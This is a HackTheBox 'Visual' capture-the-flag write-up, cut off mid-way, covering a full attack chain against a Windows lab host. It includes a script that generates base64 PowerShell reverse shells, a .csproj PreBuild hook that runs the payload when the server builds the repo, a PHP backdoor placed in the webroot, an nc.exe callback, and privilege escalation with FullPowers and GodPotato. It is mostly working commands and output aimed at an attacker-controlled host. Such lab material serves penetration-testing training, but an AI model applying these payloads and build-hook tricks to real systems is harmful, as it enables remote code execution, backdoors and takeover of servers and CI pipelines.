# HackTheBox Visual

## Service Overview

To scan machine 10.10.11.234 we will use rustscan:

```shell
$ rustscan --ulimit=5000 --range=1-65535 -a 10.10.11.234 -- -A -sC

PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: Visual - Revolutionizing Visual Studio Builds
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=12/8%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6572FB17%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10B%TI=I%II=I%SS=S%TS=U)
OPS(O1=M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54ENW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)
```

## Web Enumeration

Now directory fuzzing:

```shell
$ ffuf -u http://10.10.11.234/FUZZ -w /usr/share/dirb/wordlists/common.txt  -mc 200,204,301,302,307

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.234/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307
________________________________________________

[Status: 200, Size: 7534, Words: 2665, Lines: 118, Duration: 59ms]
    * FUZZ:

[Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 62ms]
    * FUZZ: assets

[Status: 301, Size: 335, Words: 22, Lines: 10, Duration: 68ms]
    * FUZZ: css

[Status: 200, Size: 7534, Words: 2665, Lines: 118, Duration: 56ms]
    * FUZZ: index.php

[Status: 301, Size: 334, Words: 22, Lines: 10, Duration: 78ms]
    * FUZZ: js

[Status: 301, Size: 339, Words: 22, Lines: 10, Duration: 57ms]
    * FUZZ: uploads

:: Progress: [4614/4614] :: Job [1/1] :: 579 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

We can upload our git repo here - **http://10.10.11.234/index.php**, and it will compile and generate exe and dll by itself.

Make the project:

```shell
$ wget https://dot.net/v1/dotnet-install.sh -O dotnet-install.sh
$ chmod +x ./dotnet-install.sh
$ ./dotnet-install.sh --version latest
$ ./dotnet-install.sh --channel 6.0
$ ln -s /root/.dotnet/dotnet /usr/local/bin/

$ mkdir project && cd project
$ mkdir visual
$ dotnet new console -n visual -f net6.0
$ dotnet new sln -n visual
$ dotnet sln visual.sln add visual/visual.csproj

$ git init
$ git add .
$ git commit -m "update"

$ git config user.email "visual@example.com"
$ git config user.name "visual"

$ git update-server-info
$ ls -la

total 4
drwxr-xr-x 1 root root  40 гру  8 15:29 .
drwxr-xr-x 1 root root 544 гру  8 15:29 ..
drwxr-xr-x 1 root root 144 гру  8 15:30 .git
drwxr-xr-x 1 root root  52 гру  8 15:28 visual
-rw-r--r-- 1 root root 994 гру  8 15:28 visual.sln
```

Start the python service locally and then submit git repository:

```shell
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.234 - - [08/Dec/2023 15:32:24] "GET /.git/info/refs?service=git-upload-pack HTTP/1.1" 200 -
10.10.11.234 - - [08/Dec/2023 15:32:25] "GET /.git/HEAD HTTP/1.1" 200 -
10.10.11.234 - - [08/Dec/2023 15:32:25] "GET /.git/objects/78/f80ff274060d7b228020a76c7d8b6d464421a1 HTTP/1.1" 200 -
10.10.11.234 - - [08/Dec/2023 15:32:25] "GET /.git/objects/3d/1d7af5a4c4e2334ef04b8ffdfea550d4e04cb1 HTTP/1.1" 200 -
10.10.11.234 - - [08/Dec/2023 15:32:25] "GET /.git/objects/2d/cbdb01eaa7c4f84119cc2932745c729782cd2a HTTP/1.1" 200 -
10.10.11.234 - - [08/Dec/2023 15:32:25] "GET /.git/objects/72/215b7102c7c1e0a5af99ed8b1133cb2edc45bc HTTP/1.1" 200 -
10.10.11.234 - - [08/Dec/2023 15:32:26] "GET /.git/objects/83/fa4f4d5fd1f545f64172b044a07814db23104f HTTP/1.1" 200 -
10.10.11.234 - - [08/Dec/2023 15:32:26] "GET /.git/objects/0c/fe8ad55e4179f74879add735079a5790171111 HTTP/1.1" 200 -
10.10.11.234 - - [08/Dec/2023 15:32:26] "GET /.git/objects/40/c60dd4c884340c455eab8a0020f7c681a4e76c HTTP/1.1" 200 -
10.10.11.234 - - [08/Dec/2023 15:32:26] "GET /.git/objects/d9/1b1daa521e19c6f8bfb3a66de45e194781a6a3 HTTP/1.1" 200 -
10.10.11.234 - - [08/Dec/2023 15:32:26] "GET /.git/objects/6c/39bc3d6714fbb67a88f2f9a8273ec7edd8a20d HTTP/1.1" 200 -
10.10.11.234 - - [08/Dec/2023 15:32:26] "GET /.git/objects/a2/70b60d2cbd5099203b516cc4cd0e5c3263b912 HTTP/1.1" 200 -
10.10.11.234 - - [08/Dec/2023 15:32:26] "GET /.git/objects/b0/ba30e73f88b483303d3022c49c97f438adaa1d HTTP/1.1" 200 -
10.10.11.234 - - [08/Dec/2023 15:32:26] "GET /.git/objects/3d/c06ef3cc4057524bf5d2cd49936dff789cebe8 HTTP/1.1" 200 -
```

```shell
http://10.10.11.234/index.php -> Submit Your Repo: http://10.10.16.46:8000/.git -> Submit:

[-] Your build is still being compiled. Please be patient.
```



## Gaining access

Post a script to generate a rebound shell here, or use any other tool here, as shown below:

```python
#!/usr/bin/env python3
#
# generate reverse powershell cmdline with base64 encoded args
#

import sys
import base64

def help():
    print("USAGE: %s IP PORT" % sys.argv[0])
    print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")
    exit()
    
try:
    (ip, port) = (sys.argv[1], int(sys.argv[2]))
except:
    help()

# payload from Nikhil Mittal @samratashok
# https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
payload = payload % (ip, port)

cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmdline)
```

```shell
$ python3 revshell.py 10.10.16.46 4444
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAA2ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

You can make revshell [here](https://www.revshells.com/).
At this point, we can use csproj to write the rebound shell:

```cs
$ nano ~/project/visual/visual.csproj

<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

  <Target Name="PreBuild" BeforeTargets="BeforeBuild">
    <Exec Command="powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAA2ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" />
  </Target>

</Project>
```

After modifying ~/project/visual/visual.csproj, execute:

```shell
$ cd ~/project
$ git add visual/visual.csproj
$ git commit -m "visual update"
$ git update-server-info
```

Once everything is ready, submit and get the shell:

```shell
http://10.10.11.234/index.php -> Submit Your Repo: http://10.10.16.46:8000/.git -> Submit:

[-] Your build is still being compiled. Please be patient.
```

```shell
$ nc -lnvp 4444
listening on [any] 4444 ...

connect to [10.10.16.46] from (UNKNOWN) [10.10.11.234] 49912
PS C:\Windows\Temp\a51420a8557a3c8a753c61a988273f\visual> whoami
visual\enox
PS C:\Windows\Temp\a51420a8557a3c8a753c61a988273f\visual> cd C:\Users\enox\Desktop
PS C:\Users\enox\Desktop> ls


    Directory: C:\Users\enox\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        12/8/2023  12:49 AM             34 user.txt


PS C:\Users\enox\Desktop> type user.txt
bac1b7ca5270a316f8d014b3199d35f8
PS C:\Users\enox\Desktop>
```

## Lateral Movement to nt authority\local service

You can find the website structure in the **C:\xampp\htdocs** path. Try to upload a rev PHP and perform a rebound connection. This time I chose qsd-php-backdoor.php in the webshells that comes with it.

```shell
$ cd /usr/share/webshells/php
$ ll
total 32K
drwxr-xr-x 1 root root   64 бер 23  2022 findsocket
-rw-r--r-- 1 root root 2,8K січ  8  2022 php-backdoor.php
-rwxr-xr-x 1 root root 5,4K січ  8  2022 php-reverse-shell.php
-rw-r--r-- 1 root root  14K січ  8  2022 qsd-php-backdoor.php
-rw-r--r-- 1 root root  328 січ  8  2022 simple-backdoor.php

$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.234 - - [08/Dec/2023 16:21:44] "GET /qsd-php-backdoor.php HTTP/1.1" 200 -
```

```shell
PS C:\Users\enox\Desktop> cd C:\
PS C:\> ls


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/5/2022  12:03 PM                PerfLogs
d-r---        6/10/2023  11:00 AM                Program Files
d-----        6/10/2023  10:51 AM                Program Files (x86)
d-r---        6/10/2023  10:59 AM                Users
d-----        9/19/2023   6:44 AM                Windows
d-----        12/8/2023   2:56 AM                xampp


PS C:\> cd xampp
PS C:\xampp> ls


    Directory: C:\xampp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/10/2023  10:16 AM                apache
d-----        6/10/2023  10:16 AM                cgi-bin
d-----        6/10/2023  10:16 AM                contrib
d-----         4/6/2023   9:04 AM                FileZillaFTP
d-----        12/8/2023   4:53 AM                htdocs
d-----        6/10/2023  10:16 AM                install
d-----        6/10/2023  10:16 AM                licenses
d-----        6/10/2023  10:16 AM                locale
d-----         4/6/2023   9:04 AM                MercuryMail
d-----        6/10/2023  10:17 AM                mysql
d-----        6/10/2023  10:19 AM                perl
d-----        6/10/2023  10:25 AM                php
d-----        6/10/2023  10:27 AM                phpMyAdmin
d-----        6/10/2023  10:29 AM                sendmail
d-----        6/10/2023  10:29 AM                tmp
d-----        6/10/2023  10:30 AM                tomcat
d-----         4/6/2023   9:04 AM                webalizer
d-----        6/10/2023  10:30 AM                webdav
-a----         6/7/2013  11:15 AM            436 apache_start.bat
-a----        10/1/2019   7:13 AM            190 apache_stop.bat
-a----         4/5/2021   4:16 PM          10324 catalina_service.bat
-a----         4/5/2021   4:17 PM           3766 catalina_start.bat
-a----         4/5/2021   4:17 PM           3529 catalina_stop.bat
-a----        12/8/2023   2:56 AM          36864 FullPowers.exe
-a----         6/3/2019  11:39 AM            471 mysql_start.bat
-a----        10/1/2019   7:13 AM            270 mysql_stop.bat
-a----        3/13/2017  11:04 AM            824 passwords.txt
-a----        12/8/2023   2:39 AM         600580 PowerUp.ps1
-a----         4/6/2023   9:04 AM           7653 readme_de.txt
-a----         4/6/2023   9:04 AM           7515 readme_en.txt
-a----       11/12/2015   3:13 PM            370 setup_xampp.bat
-a----       11/29/2020  12:38 PM           1671 test_php.bat
-a----         4/6/2021  11:38 AM        3368448 xampp-control.exe
-a----         4/5/2021   4:08 PM            978 xampp-control.ini
-a----        3/30/2013  12:29 PM         118784 xampp_start.exe
-a----        3/30/2013  12:29 PM         118784 xampp_stop.exe


PS C:\xampp> cd htdocs
PS C:\xampp\htdocs> ls


    Directory: C:\xampp\htdocs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/10/2023  10:32 AM                assets
d-----        6/10/2023  10:32 AM                css
d-----        6/10/2023  10:32 AM                js
d-----        12/8/2023   5:59 AM                uploads
-a----        6/10/2023   6:20 PM           7534 index.php
-a----        6/10/2023   4:17 PM           1554 submit.php
-a----        6/10/2023   4:11 PM           4970 vs_status.php


PS C:\xampp\htdocs> curl http://10.10.16.46:8000/qsd-php-backdoor.php -O shell.php
PS C:\xampp\htdocs> ls


    Directory: C:\xampp\htdocs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/10/2023  10:32 AM                assets
d-----        6/10/2023  10:32 AM                css
d-----        6/10/2023  10:32 AM                js
d-----        12/8/2023   6:09 AM                uploads
-a----        6/10/2023   6:20 PM           7534 index.php
-a----        12/8/2023   6:11 AM             30 shell.php
-a----        6/10/2023   4:17 PM           1554 submit.php
-a----        6/10/2023   4:11 PM           4970 vs_status.php


PS C:\xampp\htdocs>
```

At the bottom, you can enter the system command of the target machine or use curl and directly enter the base64 ps payload below.

```shell
$ curl http://10.10.11.234/shell.php?c=whoami
nt authority\local service

$ python3 revshell.py 10.10.16.46 4445
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAA2ACIALAA0ADQANAA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

```shell
$ curl http://10.10.11.234/shell.php?c=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAA2ACIALAA0ADQANAA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

Catch the shell:

```shell
$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.10.16.46] from (UNKNOWN) [10.10.11.234] 49974
whoami
nt authority\local service
PS C:\xampp\htdocs>
```

## Privilege escalation

Since the user is a local service, we can restore the account's default permissions.

[FullPowers](https://github.com/itm4n/FullPowers): This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only. (The powershell rebound shell generated by the previous py script here cannot restore the permissions successfully. You need to use the nc rebound shell to use it successfully)

```shell
$ sudo apt install windows-binaries
$ git clone https://github.com/itm4n/FullPowers.git
$ cd FullPowers/
$ wget https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.234 - - [08/Dec/2023 16:37:33] "GET /FullPowers.exe HTTP/1.1" 200 -
```

```shell
PS C:\xampp\htdocs> cd /
PS C:\> cd Users\Public\Documents
PS C:\Users\Public\Documents> curl http://10.10.16.46:8000/FullPowers.exe -O FullPowers.exe
PS C:\Users\Public\Documents> ls


    Directory: C:\Users\Public\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        12/8/2023   6:37 AM          36864 FullPowers.exe


PS C:\Users\Public\Documents>  whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\Users\Public\Documents> ./FullPowers.exe -c "whoami /priv"
[+] Started dummy thread with id 4628
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
PS C:\Users\Public\Documents>
```

FullPowers.exe can use the -c parameter to run the command, so upload nc and then rebound.

```shell
$ cd /usr/share/windows-resources/binaries/
$ ll
total 2,4M
drwxr-xr-x 1 root root  132 гру  8 16:58 enumplus
-rwxr-xr-x 1 root root  52K бер  3  2023 exe2bat.exe
drwxr-xr-x 1 root root  196 гру  8 16:58 fgdump
drwxr-xr-x 1 root root   38 гру  8 16:58 fport
-rwxr-xr-x 1 root root  23K бер  3  2023 klogger.exe
drwxr-xr-x 1 root root   54 гру  8 16:58 mbenum
drwxr-xr-x 1 root root  120 гру  8 16:58 nbtenum
-rwxr-xr-x 1 root root  58K бер  3  2023 nc.exe
-rwxr-xr-x 1 root root 819K бер  3  2023 plink.exe
-rwxr-xr-x 1 root root 688K бер  3  2023 radmin.exe
-rwxr-xr-x 1 root root 356K бер  3  2023 vncviewer.exe
-rwxr-xr-x 1 root root 302K бер  3  2023 wget.exe
-rwxr-xr-x 1 root root  65K бер  3  2023 whoami.exe

$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.234 - - [08/Dec/2023 17:00:09] "GET /nc.exe HTTP/1.1" 200 -
```

```shell
PS C:\Users\Public\Documents> curl http://10.10.16.46:8000/nc.exe -O nc.exe
PS C:\Users\Public\Documents> ls


    Directory: C:\Users\Public\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        12/8/2023   6:37 AM          36864 FullPowers.exe
-a----        12/8/2023   7:00 AM          59392 nc.exe


PS C:\Users\Public\Documents>./FullPowers.exe -c "C:\Users\Public\Documents\nc.exe 10.10.16.46 4444 -e powershell.exe"
```

```shell
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.46] from (UNKNOWN) [10.10.11.234] 50096
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
PS C:\Windows\system32>
```

Next directly use [GodPotato](https://github.com/BeichenDream/GodPotato), using the NET4 version:

```shell
$ cd /opt/
$ git clone https://github.com/BeichenDream/GodPotato
$ cd GodPotato/
$ wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/$ GodPotato-NET4.exe
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.234 - - [08/Dec/2023 17:11:52] "GET /GodPotato-NET4.exe HTTP/1.1" 200 -
```

Download `GodPotato-NET4.exe` and run shell:

```shell
PS C:\Users\Public\Documents> $ProgressPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
PS C:\Users\Public\Documents> curl http://10.10.16.46:8000/GodPotato-NET4.exe -O god.exe
curl http://10.10.16.46:8000/GodPotato-NET4.exe -O god.exe
PS C:\Users\Public\Documents> ls
ls


    Directory: C:\Users\Public\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        12/8/2023   6:37 AM          36864 FullPowers.exe
-a----        12/8/2023   7:11 AM          57344 god.exe
-a----        12/8/2023   7:00 AM          59392 nc.exe

PS C:\Users\Public\Documents> .\god.exe -cmd "cmd /c whoami"
.\god.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140736394690560
[*] DispatchTable: 0x140736396996720
[*] UseProtseqFunction: 0x140736396372896
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
